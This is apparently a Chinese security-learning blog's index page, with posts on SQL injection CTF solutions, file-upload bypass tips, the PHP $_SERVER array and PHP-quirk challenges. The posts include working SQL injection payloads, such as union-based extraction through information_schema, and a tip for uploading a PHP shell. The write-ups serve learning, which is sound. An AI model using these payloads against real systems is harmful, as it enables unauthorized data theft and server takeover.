<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Traveler2000🪐</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="网络安全菜鸟，大佬们见笑了">
<meta property="og:type" content="website">
<meta property="og:title" content="Traveler2000🪐">
<meta property="og:url" content="http://traveler2000.github.io/index.html">
<meta property="og:site_name" content="Traveler2000🪐">
<meta property="og:description" content="网络安全菜鸟，大佬们见笑了">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Traveler2000">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Traveler2000🪐" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Traveler2000🪐</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://traveler2000.github.io"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-SQL注入题解与知识" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/07/SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E8%A7%A3%E4%B8%8E%E7%9F%A5%E8%AF%86/" class="article-date">
  <time class="dt-published" datetime="2025-05-07T07:21:10.000Z" itemprop="datePublished">2025-05-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/05/07/SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E8%A7%A3%E4%B8%8E%E7%9F%A5%E8%AF%86/">SQL注入题解与知识</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="operator">!=</span><span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id <span class="operator">=</span> <span class="string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="string">&#x27;].&quot;&#x27;</span> limit <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p><strong>题目解析</strong></p>
<p>简单的 SQL 注入，Payload 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=1 ; -- </span><br></pre></td></tr></table></figure>

<p>没有任何过滤就拼接 SQL 语句，导致漏洞产生。下面分析 Payload 的效果：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="operator">!=</span><span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id <span class="operator">=</span> <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> ; <span class="comment">-- &quot;&#x27; limit 1;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>单引号 <code>&#39;</code> 与前面的单引号闭合，使后面的 <code>or 1=1 ; --</code> 被视为 SQL 语句而非字符串。</li>
<li><code>or 1=1</code> 与前面的表达式组合得到 <code>username !=&#39;flag&#39; and id = &#39;&quot;&#39; or 1=1</code> ：</li>
<li><code>where</code> 一般情况下<strong>检查表中的每一行</strong>，并针对每行计算 <code>where</code> 后的<strong>整个表达式</strong>的结果，若真则返回该行，反之则跳过。</li>
<li>由于 <code>and</code> 的<strong>优先级</strong>比 <code>or</code> 高，所以最终计算结果恒为 <code>1</code> 。 <code>where 1</code> 会匹配并返回所有行。</li>
<li>分号 <code>;</code> 结束该句，防止语法错误。</li>
<li>注释符 <code>-- </code> 注释掉后面的双引号、单引号与 <code>limit 1</code> 。防止语法错误，以及绕过原语句中返回结果只有一行的限制。（最后面一定要有空格，关于注释，参考另一篇简单讲解 SQL 注释符的笔记）</li>
</ul>
<h2 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h2><p>SQL 部分</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> ctfshow_user2 <span class="keyword">where</span> username <span class="operator">!=</span><span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id <span class="operator">=</span> <span class="string">&#x27;&quot;.$_GET[&#x27;</span>id<span class="string">&#x27;].&quot;&#x27;</span> limit <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>PHP 片段</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>-&gt;username!==<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>题目解析</strong></p>
<p>先探测列数：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; order by 1 -- </span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>order by</code> ：在 SQL 里，<code>ORDER BY</code> 是用于对查询结果进行排序的子句。语法如：</li>
</ul>
  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> column1 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], column2 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], ...;</span><br></pre></td></tr></table></figure>
<p>  <code>column1</code> 为列，可以是<strong>列名</strong>，也可以是<strong>索引</strong>（1,2,3…）； <code>[ASC|DESC]</code> 为升降排序的可选项。</p>
<ul>
<li><code>order by 1</code> 则是测试列数，若<strong>无报错</strong>（这里应该是空结果，因为 <code>select username,password from ctfshow_user2 where username !=&#39;flag&#39; and id = &#39;&quot;&#39; order by 1 -- </code> ，不太可能有某个字段的值为 <code>&quot;</code> ）则<strong>递增</strong>数字，直到报错为止，那么列数即为<strong>未报错的最大数字</strong>。</li>
</ul>
<p>也可以使用联合查询来探测：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,2,3,4--  --递增列数</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>union select</code> ：在 SQL 中，<code>SELECT</code> 之间用 <code>UNION</code> 连接起来，结果集合并成一个结果集。<br>合并要求：</p>
<ul>
<li><strong>列数必须相同</strong>：所有 <code>SELECT</code> 语句的列数必须一致。</li>
<li><strong>数据类型兼容</strong>：对应列的数据类型应该兼容（或可隐式转换）。</li>
<li><strong><code>ORDER BY</code> 只能放在最后</strong>：合并结果只有一张表，所以 <code>ORDER BY</code> 要放在最后给整张表排序。列名通常继承自第一张表，如果要用列名排序，需要用<strong>第一张表的列名</strong>。也可以用<strong>索引</strong>和<strong>第一张表的别名</strong>排序。</li>
</ul>
<p>基本语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">UNION</span> [<span class="keyword">ALL</span>]</span><br><span class="line"><span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> table2;</span><br></pre></td></tr></table></figure>

<p><code>UNION</code> 默认去重，使用 <code>UNION ALL</code> 合并结果时不去重。</p>
</li>
<li><p><code>union select 1,2,3,4</code> 测试列数。<strong>可以把 <code>select 1,2,3,4</code> 看作联合查询时自定义添加一行内容 <code>1,2,3,4</code> 。</strong>由于联合查询时列数必须相同，所以当无报错时，说明列数正确；如果报错，则修改列数再次测试，直到不报错。</p>
</li>
</ul>
<p>确定列数后，利用联合查询，按照下列步骤获得 flag ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,database()--  --返回数据库名</span><br><span class="line">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;&lt;库名&gt;&#x27; --  --获取数据库里的表名</span><br><span class="line">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;&lt;表名&gt;&#x27; --  --获取表内字段名</span><br><span class="line">&#x27; union select 1,group_concat(&lt;字段名&gt;) from 表名 --  --获取字段值（不要用username字段，会被后续的PHP脚本过滤掉）</span><br></pre></td></tr></table></figure>

<ul>
<li><code>database()</code> ：MySQL内置函数，返回当前连接的数据库名。</li>
<li><code>information_schema</code> ：虚拟的数据库，并不实际存储数据，由数据库系统根据元数据动态生成。包含数据库中所有数据库的信息、数据库中所有表的详细信息、数据库中所有列的信息与关于索引的元数据以及其他一些信息等等。</li>
<li><code>information_schema.tables</code> ：包含了数据库中所有表的信息，如表名、表类型、存储引擎、行数、创建时间、更新时间等。此处用于<strong>获取当前数据库中有哪些表</strong>。</li>
<li><code>where table_schema=&#39;&lt;库名&gt;&#39;</code> ：<code>table_schema</code> 是表中的一个字段，表明该表位于哪个数据库。</li>
<li><code>information_schema.columns</code> ：大致同上，此处用于<strong>获取目标表中有哪些列</strong>。</li>
<li><code>where table_name=&#39;&lt;表名&gt;&#39;</code> ：大致同上，表明列在哪张表中。</li>
<li><code>group_concat()</code> ：将多行结果合并成逗号分隔的字符串，全部表示在一行中。</li>
</ul>
<p>整个过程，就是利用联合查询与数据库的特性得到各种信息，最后得到 flag 。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/05/07/SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E8%A7%A3%E4%B8%8E%E7%9F%A5%E8%AF%86/" data-id="cmag7dmmv000bp0uh1b08aoc9" data-title="SQL注入题解与知识" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL/" rel="tag">SQL</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-文件上传小技巧" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="article-date">
  <time class="dt-published" datetime="2025-05-07T05:44:22.000Z" itemprop="datePublished">2025-05-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/05/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B0%8F%E6%8A%80%E5%B7%A7/">文件上传小技巧</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>下面列出一些文件上传的技巧：</p>
<ul>
<li>绕过前端，只需上传正常后缀的 shell 文件，再抓包并修改请求体中文件后缀为 <code>.php</code> 即可。</li>
<li>关于 <code>.user.ini</code> 的利用：<br> <code>.user.ini</code> 文件是</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/05/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B0%8F%E6%8A%80%E5%B7%A7/" data-id="cmag7dmn7002ap0uhc36aekdm" data-title="文件上传小技巧" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-SERVER数组" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/29/SERVER%E6%95%B0%E7%BB%84/" class="article-date">
  <time class="dt-published" datetime="2025-04-29T02:54:03.000Z" itemprop="datePublished">2025-04-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/">杂项知识点</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/29/SERVER%E6%95%B0%E7%BB%84/">$_SERVER 数组</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>PHP 的 <code>$_SERVER</code> 是一个<strong>预定义的超全局数组</strong>，它存储了服务器和当前请求的相关信息。这些信息包括请求头、脚本路径、客户端信息等，具体内容取决于服务器环境（如 Apache、Nginx）。</p>
<p>可以将 <code>$_SERVER</code> 数组的元素按来源和用途分为以下几类：</p>
<h4 id="1-服务器信息"><a href="#1-服务器信息" class="headerlink" title="1. 服务器信息"></a><strong>1. 服务器信息</strong></h4><p>这些值由 <strong>Web 服务器（如 Apache&#x2F;Nginx）</strong> 生成，描述服务器自身的配置和环境。</p>
<table>
<thead>
<tr>
<th align="center">元素名</th>
<th align="center">来源说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>SERVER_SOFTWARE</code></td>
<td align="center">服务器软件名称（如 <code>Apache/2.4.41</code> 或 <code>nginx/1.18.0</code>）。</td>
</tr>
<tr>
<td align="center"><code>SERVER_NAME</code></td>
<td align="center">服务器域名（基于虚拟主机配置）。</td>
</tr>
<tr>
<td align="center"><code>SERVER_ADDR</code></td>
<td align="center">服务器 IP 地址。</td>
</tr>
<tr>
<td align="center"><code>SERVER_PORT</code></td>
<td align="center">服务器监听的端口（如 <code>80</code> 或 <code>443</code>）。</td>
</tr>
<tr>
<td align="center"><code>SERVER_PROTOCOL</code></td>
<td align="center">HTTP 协议版本（如 <code>HTTP/1.1</code>）。</td>
</tr>
<tr>
<td align="center"><code>DOCUMENT_ROOT</code></td>
<td align="center">网站根目录的绝对路径（如 <code>/var/www/html</code>）。</td>
</tr>
</tbody></table>
<h4 id="2-客户端请求信息"><a href="#2-客户端请求信息" class="headerlink" title="2. 客户端请求信息"></a><strong>2. 客户端请求信息</strong></h4><p>这些值由 <strong>客户端（浏览器&#x2F;设备）</strong> 发送的 HTTP 请求头提供，其中 <code>HTTP_*</code> 开头的字段（如 <code>HTTP_REFERER</code>、<code>HTTP_USER_AGENT</code>）<strong>均来自客户端请求头</strong>，也就是可以通过修改请求头自定义写入 <code>$_SERVER</code> 数组的元素。</p>
<table>
<thead>
<tr>
<th align="center">元素名</th>
<th align="center">来源说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>REQUEST_METHOD</code></td>
<td align="center">HTTP 请求方法（如 <code>GET</code>、<code>POST</code>）。</td>
</tr>
<tr>
<td align="center"><code>HTTP_USER_AGENT</code></td>
<td align="center">客户端浏览器和操作系统信息（如 <code>Mozilla/5.0... Chrome/120.0...</code>）。</td>
</tr>
<tr>
<td align="center"><code>HTTP_REFERER</code></td>
<td align="center">用户来源页面的 URL（可能为空或被篡改）。</td>
</tr>
<tr>
<td align="center"><code>HTTP_ACCEPT_LANGUAGE</code></td>
<td align="center">客户端接受的语言（如 <code>en-US,en;q=0.9</code>）。</td>
</tr>
<tr>
<td align="center"><code>HTTP_X_FORWARDED_FOR</code></td>
<td align="center">经过代理时的客户端原始 IP（需代理服务器支持，可能被伪造）。</td>
</tr>
</tbody></table>
<p>例如，如果请求头中添加 <code>Flag: value</code> 字段， <code>$_SERVER</code> 数组中也会生成对应的元素 <code>$_SERVER[HTTP_FLAG]</code> 。注意添加了前缀 <code>HTTP_</code> 并全部大写。</p>
<h4 id="3-脚本路径信息"><a href="#3-脚本路径信息" class="headerlink" title="3. 脚本路径信息"></a><strong>3. 脚本路径信息</strong></h4><p>由 <strong>Web 服务器</strong> 根据请求的 URL 和文件路径生成。</p>
<table>
<thead>
<tr>
<th align="center">元素名</th>
<th align="center">来源说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>PHP_SELF</code></td>
<td align="center">当前脚本的相对路径（如 <code>/index.php</code>）。<strong>易受 XSS 攻击</strong>，需转义输出！</td>
</tr>
<tr>
<td align="center"><code>SCRIPT_FILENAME</code></td>
<td align="center">当前脚本的绝对路径（如 <code>/var/www/index.php</code>）。</td>
</tr>
<tr>
<td align="center"><code>SCRIPT_NAME</code></td>
<td align="center">当前脚本的路径（与 <code>PHP_SELF</code> 类似，但更安全）。</td>
</tr>
<tr>
<td align="center"><code>REQUEST_URI</code></td>
<td align="center">请求的 URI（包含查询参数，如 <code>/page.php?id=1</code>）。</td>
</tr>
<tr>
<td align="center"><code>QUERY_STRING</code></td>
<td align="center">URL 中的查询字符串（如 <code>id=1&amp;name=test</code> ）。</td>
</tr>
</tbody></table>
<h4 id="4-客户端网络信息"><a href="#4-客户端网络信息" class="headerlink" title="4. 客户端网络信息"></a><strong>4. 客户端网络信息</strong></h4><p>由 <strong>Web 服务器</strong> 从 TCP&#x2F;IP 连接中获取，部分可能被代理影响。</p>
<table>
<thead>
<tr>
<th align="center">元素名</th>
<th align="center">来源说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>REMOTE_ADDR</code></td>
<td align="center">客户端 IP 地址（直接连接的 IP，代理场景下可能是代理服务器 IP）。</td>
</tr>
<tr>
<td align="center"><code>REMOTE_PORT</code></td>
<td align="center">客户端使用的端口号。</td>
</tr>
</tbody></table>
<h4 id="5-HTTPS-和安全相关"><a href="#5-HTTPS-和安全相关" class="headerlink" title="5. HTTPS 和安全相关"></a><strong>5. HTTPS 和安全相关</strong></h4><p>由 <strong>Web 服务器</strong> 根据连接协议生成。</p>
<table>
<thead>
<tr>
<th align="center">元素名</th>
<th align="center">来源说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>HTTPS</code></td>
<td align="center">如果通过 HTTPS 访问，值为 <code>on</code>，否则为空。</td>
</tr>
<tr>
<td align="center"><code>REQUEST_SCHEME</code></td>
<td align="center">请求的协议（如 <code>http</code> 或 <code>https</code>）。</td>
</tr>
<tr>
<td align="center"><code>SERVER_PORT_SECURE</code></td>
<td align="center">如果使用 HTTPS，值为 <code>1</code>，否则为空（部分服务器支持）。</td>
</tr>
</tbody></table>
<h4 id="6-其他特殊字段"><a href="#6-其他特殊字段" class="headerlink" title="6. 其他特殊字段"></a><strong>6. 其他特殊字段</strong></h4><table>
<thead>
<tr>
<th align="center">元素名</th>
<th align="center">来源说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>GATEWAY_INTERFACE</code></td>
<td align="center">服务器使用的 CGI 版本（如 <code>CGI/1.1</code>）。</td>
</tr>
<tr>
<td align="center"><code>PATH_TRANSLATED</code></td>
<td align="center">服务器将路径映射到文件系统的结果（部分服务器支持）。</td>
</tr>
</tbody></table>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://traveler2000.github.io/2025/04/29/SERVER%E6%95%B0%E7%BB%84/" data-id="cmag7dmmy000ip0uhbj9s0jgi" data-title="$_SERVER 数组" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">杂项知识点</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-PHP特性题目" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/04/27/PHP%E7%89%B9%E6%80%A7%E9%A2%98%E7%9B%AE/" class="article-date">
  <time class="dt-published" datetime="2025-04-27T07:47:49.000Z" itemprop="datePublished">2025-04-27</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/PHP%E7%89%B9%E6%80%A7%E9%A2%98%E7%9B%AE/">PHP特性题目</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/04/27/PHP%E7%89%B9%E6%80%A7%E9%A2%98%E7%9B%AE/">PHP 特性题目</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解题思路</strong></p>
<ul>
<li><p><code>preg_match()</code> 函数传入的参数只能是字符串，如果传入数组会报错，返回 <code>FALSE</code> 。</p>
</li>
<li><p><code>intval()</code> 函数将变量转换为整数类型。</p>
</li>
<li><p>当字符串是纯数字时，能正常转换为整数。</p>
</li>
<li><p>若字符串开头不是数字，转换结果为 0。</p>
</li>
<li><p>字符串开头为数字，会把开头的数字部分转换为整数，其他省略。</p>
</li>
<li><p>若 <code>intval()</code> 函数传入值为数组，当数组为空时返回 0 ，数组不为空时返回 1 。</p>
</li>
<li><p>构造 Payload ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=1</span><br></pre></td></tr></table></figure>

<p><strong>tips</strong>：在 URL 参数名后面加上 <code>[]</code> 来表明这是一个数组参数，每个数组元素作为一个单独的参数键值对，参数名相同，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num[]=1&amp;num[]=2&amp;num[]=3</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解题思路</strong></p>
<ul>
<li><p><code>/^php$/im</code> ：按行匹配，不区分大小写，匹配是否有一行的内容完全对应 <code>php</code> 。</p>
</li>
<li><p><code>/^php$/i</code> ：不区分大小写，匹配整段字符串的内容是否为 <code>php</code> 。</p>
</li>
<li><p>注意：按行匹配是以换行符 <code>%0A</code> 为每行的结尾来区分每行、进行匹配的，也就是说下面这种情况只能算一行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=php%0A</span><br></pre></td></tr></table></figure>

<p>如果是下面这种情况就算两行，也就是本题 Payload ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%0Aphp</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h2><p>类似的题，只需要参考下列题目变换 Payload 即可。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解题思路</strong></p>
<ul>
<li><p><code>===</code> 参考 JavaScript ，不仅数值要相等，数据类型也要相等。</p>
</li>
